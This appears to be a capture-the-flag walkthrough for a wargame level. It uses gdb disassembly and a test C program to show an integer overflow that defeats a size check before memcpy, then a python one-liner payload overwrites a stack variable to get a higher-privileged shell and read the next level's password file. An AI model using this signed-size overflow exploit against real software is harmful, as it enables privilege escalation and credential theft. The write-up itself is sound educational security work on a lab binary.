The source code for this level is in level07.c

We see that the `count` variable needs to be set to 0x574f4c46 in order for us to win. But there's a check at the beginning that prevents us from just simply passing in a positive number. We need to make the size parameter for memcpy into something that will overflow the `buf[10]` buffer and overwrite the count variable. Let's see how far apart they are in memory.
```
evel7@io:/levels$ gdb -q level07
Reading symbols from /levels/level07...done.
(gdb) set disassembly-flavor intel
(gdb) display/10i $eip
(gdb) break main
Breakpoint 1 at 0x804841a
(gdb) run 1 AAAAA
Starting program: /levels/level07 1 AAAAA

Breakpoint 1, 0x0804841a in main ()
1: x/10i $eip
=> 0x804841a <main+6>:   and    esp,0xfffffff0
   0x804841d <main+9>:   mov    eax,0x0
   0x8048422 <main+14>:  sub    esp,eax
   0x8048424 <main+16>:  mov    eax,DWORD PTR [ebp+0xc]
   0x8048427 <main+19>:  add    eax,0x4
   0x804842a <main+22>:  mov    eax,DWORD PTR [eax]
   0x804842c <main+24>:  mov    DWORD PTR [esp],eax
   0x804842f <main+27>:  call   0x8048354 <atoi@plt>
   0x8048434 <main+32>:  mov    DWORD PTR [ebp-0xc],eax
   0x8048437 <main+35>:  cmp    DWORD PTR [ebp-0xc],0x9

...

(gdb) ni
0x08048462 in main ()
1: x/10i $eip
=> 0x8048462 <main+78>:  call   0x8048334 <memcpy@plt>
   0x8048467 <main+83>:  cmp    DWORD PTR [ebp-0xc],0x574f4c46
   0x804846e <main+90>:  jne    0x804849a <main+134>
   0x8048470 <main+92>:  mov    DWORD PTR [esp],0x8048584
   0x8048477 <main+99>:  call   0x8048344 <printf@plt>
   0x804847c <main+104>: mov    DWORD PTR [esp+0x8],0x0
   0x8048484 <main+112>: mov    DWORD PTR [esp+0x4],0x804858a
   0x804848c <main+120>: mov    DWORD PTR [esp],0x804858d
   0x8048493 <main+127>: call   0x8048324 <execl@plt>
   0x8048498 <main+132>: jmp    0x80484a6 <main+146>
(gdb) x/3xw $esp
0xbffffc30:  0xbffffc50  0xbffffe80  0x00000004
(gdb) x/xw $ebp-0xc
0xbffffc8c:  0x00000001
```

After looking at the disassembly, we can see that the count variable is at `[ebp-0xc]` and right before we call memcpy, the arguments for destination, source, and size are on the stack in that order. So the buffer `buf[10]` starts at 0xbffffc50 and count is at 0xbffffc8c.
```
(gdb) p 0xbffffc8c - 0xbffffc50
$1 = 60
```

So they're 60 bytes apart. We need to write 60 bytes up until `count` and then the next four bytes will overwrite it and we'll win. But we don't know how to accomplish this yet. This basic program will help us understand how we can make this happen. We need to know what the value of `count` is going to be when it's passed into memcpy and this will help us figure it out.
```
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

int main(int argc, char **argv) {
    int count = atoi(argv[1]);

    printf("%i\n", count*sizeof(int));
    printf("%x\n", count*sizeof(int));

    return 0;
}

...

level7@io:/tmp/ZZZ$ gcc -o test test.c
level7@io:/tmp/ZZZ$ ./test -1 AAAA
-4
fffffffc
```

Since -4 is below 10, we can pass the first check `count >= 10`. It'll set the size argument for memcpy to be 0xfffffffc, and considering that that argument is treated as an unsigned int, that means that we're going to write WAY too much data. We need a smaller number. Let's try to cause an overflow by passing in a huge negative number and seeing the result is.
```
level7@io:/tmp/ZZZ$ ./test -2147483648 AAAAA
0
0
level7@io:/tmp/ZZZ$ ./test -2147483647 AAAAA
4
4
level7@io:/tmp/ZZZ$ ./test -2147483646 AAAAA
8
8
level7@io:/tmp/ZZZ$ ./test -2147483640 AAAAA
32
20
level7@io:/tmp/ZZZ$ ./test -2147483630 AAAAA
72
48
level7@io:/tmp/ZZZ$ ./test -2147483632 AAAAA
64
40
```

So we see that really large negative numbers wrap back around and give us positive numbers. This will help us satisfy the original check against the `count` variable and allow us to write a controlled amount of data*. So remember we need 64 bytes where the first 60 are junk and the last 4 are "\x46\x4c\x4f\x57".
```
level7@io:/levels$ ./level07 -2147483632 $(python -c 'print "A"*60 + "\x46\x4c\x4f\x57"')
WIN!
sh-4.2$ whoami
level8
sh-4.2$ cat /home/level8/.pass
[Password for level8]
```

(*)If you're wondering why -2147483648 gives us 0 when you run that test program, go back to the walkthrough forlevel 2 and see if you can figure it out
